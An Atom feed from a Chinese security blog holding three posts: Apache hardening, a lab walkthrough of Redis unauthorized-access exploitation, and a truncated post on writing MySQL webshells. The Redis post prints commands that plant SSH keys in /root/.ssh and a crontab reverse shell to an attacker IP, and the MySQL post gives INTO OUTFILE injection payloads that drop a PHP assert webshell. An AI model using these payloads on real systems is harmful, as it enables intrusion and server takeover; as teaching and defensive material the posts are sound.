<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2020-03-04T03:44:06.019Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Apache安全配置</title>
    <link href="http://bai-ren-1.github.io/2020/03/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://bai-ren-1.github.io/2020/03/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</id>
    <published>2020-03-04T03:00:59.000Z</published>
    <updated>2020-03-04T03:44:06.019Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache安全配置"><a href="#Apache安全配置" class="headerlink" title="Apache安全配置"></a>Apache安全配置</h1><p>转载自 <a href="https://www.jianshu.com/p/a8bab3f50c7b" target="_blank" rel="noopener">https://www.jianshu.com/p/a8bab3f50c7b</a> </p><p>隐藏报错信息 -&gt; 隐藏目录列举 -&gt; 配置上传文件权限 -&gt; 配置Apache运行权限 -&gt; 处理Apache日志</p><h2 id="0x00-安全配置思维导图"><a href="#0x00-安全配置思维导图" class="headerlink" title="0x00 安全配置思维导图"></a>0x00 安全配置思维导图</h2><p><img src="/2020/03/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/1.png" alt></p><h2 id="0x01-错误详情页banner隐藏"><a href="#0x01-错误详情页banner隐藏" class="headerlink" title="0x01 错误详情页banner隐藏"></a>0x01 错误详情页banner隐藏</h2><h3 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h3><p>黑客在渗透的过程中，收集服务器的信息是至关重要的，这对于他在后期漏洞的利用上有很大的帮助。 </p><p><img src="/2020/03/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/2.png" alt></p><p>查看响应头信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> -I  http://114.115.214.203/zk/shell.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 05 Dec 2017 07:47:46 GMT</span><br><span class="line">Server: Apache/2.4.7 (Ubuntu)         <span class="comment">#中间件版本及操作系统</span></span><br><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.22   <span class="comment"># 显示服务端脚本语言及版本号</span></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><h3 id="修复方法："><a href="#修复方法：" class="headerlink" title="修复方法："></a>修复方法：</h3><p>1）修改配置文件：<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code>隐藏中间件信息。修改或者添加以下配置，<strong>隐藏中间件版本和os</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ServerTokens</span> Prod</span><br><span class="line"><span class="attribute">ServerSignature</span> <span class="literal">Off</span></span><br></pre></td></tr></table></figure><p>2）修改配置文件：<code>/etc/php5/apache2/php.ini</code>第367行隐藏PHP信息，将expose_php = On修改为Off，<strong>隐藏服务端脚本语言和版本</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">expose_php</span> =  <span class="literal">Off</span></span><br></pre></td></tr></table></figure><p>3）保存退出之后，重启apache服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># service apache2 restart</span></span><br><span class="line">Restarting web server apache2                                         [ OK ]</span><br></pre></td></tr></table></figure><p>4）再次访问不存在的页面，已经没有banner信息了。</p><p><img src="/2020/03/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/3.jpg" alt>查看响应头信息:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> -I  http://114.115.214.203/zk/shell.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 05 Dec 2017 07:51:41 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><h2 id="0x02-列目录问题"><a href="#0x02-列目录问题" class="headerlink" title="0x02 列目录问题"></a>0x02 列目录问题</h2><h3 id="危害：-1"><a href="#危害：-1" class="headerlink" title="危害："></a>危害：</h3><p>当Web服务器配置不当的时候，如果当前目录不存在默认文件（比如index.html），Apache会列出当前目录下所有文件，造成敏感信息泄露。如下图所示：</p><p><img src="/2020/03/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/6.png" alt></p><h3 id="修复方法：-1"><a href="#修复方法：-1" class="headerlink" title="修复方法："></a>修复方法：</h3><p>1）修改配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/&gt;</span>   <span class="comment">#这边必须是网站根路径</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p><code>Options Indexes FollowSymLinks</code></p><blockquote><p>这里的indexes 是指在目录中要存在index文件，如果不存在把文件列出来，如果存在index文件可以直接显</p><p>index文件，因此每个目录都必须存在index文件，如果不存在有可能此目录把文件全部列出来。</p></blockquote><p>2）删除Indexes这个参数，然后重启apache服务。<code>service apache2 restart</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/&gt;</span>   <span class="comment">#这边必须是网站根路径</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p>3）再次访问就出现403 Forbidden页面</p><p><img src="/2020/03/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/4.png" alt></p><h2 id="0x03-文件权限问题"><a href="#0x03-文件权限问题" class="headerlink" title="0x03 文件权限问题"></a>0x03 文件权限问题</h2><h3 id="危害：-2"><a href="#危害：-2" class="headerlink" title="危害："></a>危害：</h3><p>现在大部分站点都存在文件上传，比如说头像上传，附件上传等等。如果在代码层对上传的文件限制的不够严格，很容易被上传Webshell。一旦被上传Webshell对服务器造成十分大的威胁。</p><h3 id="修复方法：-2"><a href="#修复方法：-2" class="headerlink" title="修复方法："></a>修复方法：</h3><p>如果我们对存放上传文件的目录限制脚本执行的权限的话，上传的脚本文件就无法执行，在一定程度上能够减轻黑客攻击造成的危害，并且还不影响正常的业务，上穿的图片不需要执行权限，也能正常打开。</p><p>1）修改配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/html/zk/&gt;</span> <span class="comment">#这里文件夹设置想要限制的 </span></span><br><span class="line"><span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p>2）此时上传的小马已经无法执行</p><p><img src="/2020/03/04/Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/5.png" alt></p><h2 id="0x04-服务器运行权限问题"><a href="#0x04-服务器运行权限问题" class="headerlink" title="0x04 服务器运行权限问题"></a>0x04 服务器运行权限问题</h2><p>1）查看Apache的进程：lsof -i:80</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># lsof -i:80</span></span><br><span class="line">COMMAND   PID     USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME</span><br><span class="line">apache2 11302     root    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11304 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11305 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11306 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11307 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 11308 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 13248 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2 14885 www-data    4u  IPv6 28205389      0t0  TCP *:http (LISTEN)</span><br></pre></td></tr></table></figure><p>2）或者ps aux|grep apache|grep -v grep</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ps -aux | grep apache |grep -v grep</span></span><br><span class="line">root      11302  0.0  0.2  71104  2340 ?        Ss   Dec04   0:03 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11304  0.0  0.2  71176  2252 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11305  0.0  0.2  71176  2256 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11306  0.0  0.2  71200  2284 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11307  0.0  0.2  71184  2252 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  11308  0.0  0.2  71176  2276 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  13248  0.0  0.2  71176  2352 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data  14885  0.0  0.2  71176  2368 ?        S    Dec04   0:00 /usr/sbin/apache2 -k start</span><br></pre></td></tr></table></figure><p>第一行是Apache的主进程，是以root运行的。因为Apache的Web开放的端口是80或者443，小于1024的端口需要有root权限，因此主进程必须是root.从第二行开始为Apache的子进程。用户为www-data，是Ubuntu中运行服务的默认用户，权限较低。</p><p>如果用户为www-data用户的话，此时就算黑客拿到一个webshell，权限也是比较低的。</p><p>3）配置权限</p><p>如果管理配置不当（默认安装为www-data），这里是高权限用户的话，需要更改为低权限用户。</p><p>配置文件路径为：/var/apache2/envvars文件中16、17行进行配置：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.</span></span><br><span class="line"><span class="attribute">export</span> APACHE_RUN_USER=www-data</span><br><span class="line"><span class="attribute">export</span> APACHE_RUN_GROUP=www-data</span><br></pre></td></tr></table></figure><h2 id="0x05-Apache日志文件格式"><a href="#0x05-Apache日志文件格式" class="headerlink" title="0x05 Apache日志文件格式"></a>0x05 Apache日志文件格式</h2><p>Apache会生成两个主要的日志文件，一个是Web访问日志<code>access.log</code>，一个是记录服务器运行时出错的日志<code>error.log</code>。</p><p>1）配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code>中定义了日志格式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">212</span> LogFormat <span class="string">"%v:%p %h %l %u %t \"%r\" %&gt;s %O \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\""</span> vhost_combined</span><br><span class="line"><span class="attribute">213</span> LogFormat <span class="string">"%h %l %u %t \"%r\" %&gt;s %O \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\""</span> combined</span><br><span class="line"><span class="attribute">214</span> LogFormat <span class="string">"%h %l %u %t \"%r\" %&gt;s %O"</span> common</span><br><span class="line"><span class="attribute">215</span> LogFormat <span class="string">"%&#123;Referer&#125;i -&gt; %U"</span> referer</span><br><span class="line"><span class="attribute">216</span> LogFormat <span class="string">"%&#123;User-agent&#125;i"</span> agent</span><br><span class="line"><span class="attribute">217</span></span><br><span class="line"><span class="attribute">218</span></span><br><span class="line"><span class="attribute">219</span> CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log common</span><br><span class="line"></span><br><span class="line"><span class="attribute">212</span>行是虚拟主机的日志格式</span><br><span class="line"><span class="attribute">213</span>行是组合日志格式</span><br><span class="line"><span class="attribute">213</span>行是通用的日志格式</span><br><span class="line"><span class="attribute">219</span>行自定义设置日志使用那个格式的日志</span><br></pre></td></tr></table></figure><p>2） <code>/var/log/apache2/access.log</code>日志格式如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">111</span>.196.209.199 - -<span class="meta"> [05/Dec/2017:22:40:02 +0800] "GET /zk/shell.php HTTP/1.1" 304 164 "http://114.115.214.203/zk/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">远端主机：111.196.209.199</span></span><br><span class="line"><span class="meta">远端登录名：-</span></span><br><span class="line"><span class="meta">远程用户名：-</span></span><br><span class="line"><span class="meta">访问时间：[05/Dec/2017:22:40:02 +0800]</span></span><br><span class="line"><span class="attribute">HTTP</span>请求：GET /zk/shell.php HTTP/1.1</span><br><span class="line"><span class="attribute">HTTP</span>状态码：304</span><br><span class="line">发送的字节数：164</span><br><span class="line"><span class="attribute">Referer</span>：http://114.115.214.203/zk/</span><br><span class="line"><span class="attribute">User</span>-Agent：<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"</span></span><br></pre></td></tr></table></figure><p>3） <code>/var/log/apache2/error.log</code>日志格式如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Tue Dec 05 22:39:10.798632 2017</span>] [core:notice] [pid <span class="number">2970</span>] AH00094: Command line: <span class="string">'/usr/sbin/apache2'</span></span><br><span class="line">[<span class="meta">日期和时间</span>]   [错误等级]   错误消息</span><br></pre></td></tr></table></figure><p>4）日志备份</p><p>在服务器受到入侵之后，我们可以观察访问日志来溯源。当然如果access.log文件被删除清空之后就会变的非常麻烦，因此很多大型企业都设置的日志服务器同步日志文件到其它服务器，这样黑客想要彻底清除痕迹还需要搞定日志服务器。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Apache安全配置&quot;&gt;&lt;a href=&quot;#Apache安全配置&quot; class=&quot;headerlink&quot; title=&quot;Apache安全配置&quot;&gt;&lt;/a&gt;Apache安全配置&lt;/h1&gt;&lt;p&gt;转载自 &lt;a href=&quot;https://www.jianshu.com/p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis未授权访问</title>
    <link href="http://bai-ren-1.github.io/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://bai-ren-1.github.io/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2020-03-03T08:30:25.000Z</published>
    <updated>2020-03-03T09:24:07.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><p>很简单的内容，这里只做第一个实验。后面的实验做法网上很多。通过三种攻击介绍Redis未授权访问的利用。</p><h2 id="Redis写Webshell"><a href="#Redis写Webshell" class="headerlink" title="Redis写Webshell"></a>Redis写Webshell</h2><p>首先在靶机Ubuntu和攻击机Kali上都配置Redis环境。查看一下两台机器的ip环境，靶机的ip为192.168.3.74：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/ubuntu%E7%9A%84ip.png" alt></p><p>攻击机的ip为：192.168.3.66：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E7%9A%84ip.png" alt></p><p>在靶机上开启我们的Redis服务：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/ubuntu%E5%BC%80%E6%9C%8D%E5%8A%A1.png" alt></p><p>然后我们在攻击机上通过命令连接redis服务：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E8%BF%9E%E6%8E%A5.png" alt></p><p>可以看到我们能连接到Redis服务器上，Redis的服务是暴露在外的。那么不多说直接设置目录然后写入shell：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5shell.png" alt></p><p>然后就可以在靶机上看到了被植入了一个Webshell：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5.png" alt></p><p>第一个实验写入Webshell到此成功执行。</p><h2 id="Redis写SSH公钥"><a href="#Redis写SSH公钥" class="headerlink" title="Redis写SSH公钥"></a>Redis写SSH公钥</h2><p>首先我们在攻击机上生成公私钥对，passphrase设置为空：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5.png" alt></p><p>我们把公钥写入一个文件1.txt中：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6.png" alt></p><p>攻击机连接到靶机并把保存公钥的1.txt写入Redis中：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E8%AE%BE%E7%BD%AE%E5%85%AC%E9%92%A5.png" alt></p><p>使用命令得到Redis的路径后修改到SSH公钥保存的目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.74:6379&gt; CONFIG GET dir</span><br><span class="line">1)"dir"</span><br><span class="line">2)"/home/chenxiaoyi"</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG GET dbfilename</span><br><span class="line">1)"dbfilename"</span><br><span class="line">2)"authorized_keys"</span><br><span class="line">192.168.3.74:6379&gt; SAVE</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; EXIT</span><br></pre></td></tr></table></figure><p>然后我们退出连接后再在攻击机里面用SSH来连接到靶机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.3.74</span><br></pre></td></tr></table></figure><h2 id="Redis利用crontab反弹shell"><a href="#Redis利用crontab反弹shell" class="headerlink" title="Redis利用crontab反弹shell"></a>Redis利用crontab反弹shell</h2><p>这个就不进行实验了，贴一下代码。首先在攻击机上开启监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>然后连接到Redis后并写入反弹shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.3.74</span><br><span class="line">set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.3.66/4444 0&gt;&amp;1\n</span><br></pre></td></tr></table></figure><p>然后执行下面命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.74:6379&gt; CONFIG SET dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; SAVE</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>最后在攻击机上就能收到一个shell。</p><blockquote><p>这里介绍一下crontab –  使用定时任务来反弹shell：</p><ul><li>系统任务调度文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/crontab</span><br></pre></td></tr></table></figure><ul><li>用户 XXX 调度文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 下路径</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Alpine 下路径</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line"></span><br><span class="line">debian 下的路径（xxx 可以是任意东西）</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line">或者</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line">但是写这个路径的时候，文件内不能加用户名。</span><br></pre></td></tr></table></figure></blockquote><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><ul><li><p>采用绑定IP的方式来进行控制</p><p>请在redis.conf文件找到如下配置</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="comment"># If you want you can bind a single interface, if the bind option is not``# specified all the interfaces will listen for incoming connections.``#``# bind 127.0.0.1`</span></span><br></pre></td></tr></table></figure><p>把 #bind 127.0.0.1前面的注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址，表示只允许该ip进行访问，这种情况下，我们在启动redis服务器的时候不能再用:redis-server，改为:redis-server path/redis.conf 即在启动的时候指定需要加载的配置文件,其中path/是你上面修改的redis配置文件所在目录，这个方法有一点不太好，我难免有多台机器访问一个redis服务。</p><ul><li>设置密码，以提供远程登陆</li></ul><p>打开redis.conf配置文件，找到requirepass，然后修改如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`requirepass yourpassword``yourpassword就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。`` ` `命令如下:``redis-cli -h yourIp -p yourPort``//启动redis客户端，并连接服务器``keys * ``//输出服务器中的所有key``报错如下``(error) ERR operation not permitted`` ` `这时候你可以用授权命令进行授权，就不报错了`` ` `命令如下:``auth youpassword`</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>渗透中可以多扫描一下6379的Redis端口，是个很好利用的点。然后要学会Redis的正确配置，防止被人攻下。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9548962.html</a> </li><li><a href="https://nightmorning.site/wordpress/?p=755" target="_blank" rel="noopener">https://nightmorning.site/wordpress/?p=755</a> </li><li><a href="https://www.cnblogs.com/v1vvwv/p/how-to-use-crontab-to-getshell.html" target="_blank" rel="noopener">https://www.cnblogs.com/v1vvwv/p/how-to-use-crontab-to-getshell.html</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis未授权访问&quot;&gt;&lt;a href=&quot;#Redis未授权访问&quot; class=&quot;headerlink&quot; title=&quot;Redis未授权访问&quot;&gt;&lt;/a&gt;Redis未授权访问&lt;/h1&gt;&lt;p&gt;很简单的内容，这里只做第一个实验。后面的实验做法网上很多。通过三种攻击介绍R
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>MYSQL提权</title>
    <link href="http://bai-ren-1.github.io/2020/03/02/MYSQL%E6%8F%90%E6%9D%83/"/>
    <id>http://bai-ren-1.github.io/2020/03/02/MYSQL%E6%8F%90%E6%9D%83/</id>
    <published>2020-03-02T07:58:51.000Z</published>
    <updated>2020-03-04T02:54:54.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MYSQL写Webshell"><a href="#MYSQL写Webshell" class="headerlink" title="MYSQL写Webshell"></a>MYSQL写Webshell</h1><p>写Webshell比较常见的方法有：</p><ul><li>select … into outfile</li><li>general_log</li></ul><hr><h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><h3 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1.利用条件"></a>1.利用条件</h3><ul><li>对web目录有写权限</li><li>GPC关闭（能使用单引号）</li><li>有绝对路径（读文件可以不用，写文件必须）</li><li>没有配置 <code>–secure-file-priv</code></li></ul><h3 id="2-利用方式"><a href="#2-利用方式" class="headerlink" title="2.利用方式"></a>2.利用方式</h3><ul><li>有 <code>union</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2) union select 1,2,3,4,5,6,7,&apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’ into outfile ‘/home/wwwroot/shadowyspirits/evil.php’%23</span><br><span class="line">1</span><br></pre></td></tr></table></figure><ul><li>无 <code>union</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2) into outfile ‘/home/wwwroot/shadowyspirits/evil.php’ fields terminated by ‘&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’%23</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>其中 <code>fields terminated by</code> 是用来指定列之间分隔符，如果查询结果为单列则不会插入分隔符，所以必须有多个列才能成功写入一句话。</p><hr><h2 id="general-log"><a href="#general-log" class="headerlink" title="general_log"></a>general_log</h2><h4 id="1-利用条件-1"><a href="#1-利用条件-1" class="headerlink" title="1.利用条件"></a>1.利用条件</h4><ul><li>对web目录有写权限</li><li>GPC关闭（能使用单引号）</li><li>有绝对路径（读文件可以不用，写文件必须）</li><li>需要能执行多行sql语句</li></ul><h3 id="2-利用方式-1"><a href="#2-利用方式-1" class="headerlink" title="2.利用方式"></a>2.利用方式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> 